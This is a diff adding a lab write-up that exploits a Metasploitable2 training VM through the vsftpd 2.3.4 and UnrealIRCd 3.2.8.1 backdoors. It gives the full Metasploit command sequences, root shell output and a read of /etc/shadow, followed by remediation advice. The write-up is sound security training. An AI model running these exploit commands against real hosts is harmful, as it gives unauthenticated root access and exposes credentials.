@@ -1,1 +1,122 @@
-# Metasploitable2vsKaliVM
+# Exploitation
+
+## Target
+- **IP:** 192.168.56.102 (Metasploitable2)
+
+Two independent vulnerabilities were identified during the
+reconnaissance phase and successfully exploited, demonstrating that a
+single misconfigured/outdated host can present multiple unrelated attack
+paths to full compromise.
+
+---
+
+## Exploit 1: vsftpd 2.3.4 Backdoor
+
+### Vulnerability
+vsftpd 2.3.4 was distributed with a malicious backdoor inserted into the
+source code for a short period in 2011. Sending a username ending in the
+sequence `:)` causes the backdoored binary to open a listening shell on
+port 6200, granting remote command execution with no valid credentials
+required.
+
+### Tools Used
+- Metasploit Framework (`msfconsole`)
+
+### Methodology
+```
+msf6 > search vsftpd
+msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+msf6 > set RHOSTS 192.168.56.102
+msf6 > set LHOST 192.168.56.101
+msf6 > exploit
+```
+
+### Result
+```
+[+] 192.168.56.102:21 - The target appears to be vulnerable.
+[+] 192.168.56.102:21 - Backdoor has been spawned!
+[*] Meterpreter session opened
+```
+
+Dropped into a shell and confirmed access:
+```
+shell
+whoami
+root
+
+id
+uid=0(root) gid=0(root)
+```
+
+**Full root access obtained with zero valid credentials.**
+
+---
+
+## Exploit 2: UnrealIRCd 3.2.8.1 Backdoor
+
+### Vulnerability
+UnrealIRCd versions in the 3.2.8.x range were distributed from a
+compromised download mirror containing a backdoor. A specially crafted
+string sent to the IRC service triggers arbitrary command execution.
+
+### Tools Used
+- Metasploit Framework (`msfconsole`)
+
+### Methodology
+```
+msf6 > search unrealircd
+msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor
+msf6 > set RHOSTS 192.168.56.102
+msf6 > set LHOST 192.168.56.101
+msf6 > exploit
+```
+
+### Result
+```
+[+] 192.168.56.102:6667 - The target appears to be vulnerable.
+[*] Meterpreter session opened
+```
+
+Dropped into a shell and confirmed access:
+```
+shell
+whoami
+root
+
+id
+uid=0(root) gid=0(root)
+```
+
+**Full root access obtained via a second, entirely independent path.**
+
+---
+
+## Impact (Both Exploits)
+
+Both vulnerabilities grant immediate, unauthenticated root access to the
+target system. With this level of access, an attacker could:
+
+- Read `/etc/shadow`, exposing password hashes for every account on the
+  system (confirmed — see below)
+- Install persistence mechanisms (cron jobs, SSH keys, backdoor
+  accounts)
+- Pivot to other systems reachable from the compromised host
+- Exfiltrate, modify, or destroy any data on the system
+
+As proof of impact, the contents of `/etc/shadow` were successfully read
+following the vsftpd exploit, confirming full filesystem access at the
+highest privilege level.
+
+## Remediation
+
+- **Immediate:** Patch or remove vsftpd 2.3.4 and UnrealIRCd 3.2.8.x;
+  verify installer/source checksums against official published hashes
+  before deploying any third-party software
+- **Short-term:** Disable all unnecessary services — this single host
+  exposed 21 listening ports, the large majority of which serve no
+  legitimate business purpose and only expand the attack surface
+- **Ongoing:** Implement a patch management process that cross-references
+  installed software versions against current CVE databases on a
+  regular schedule
+- **Architectural:** Apply network segmentation so that even if a host
+  is compromised, lateral movement to other systems is restricted
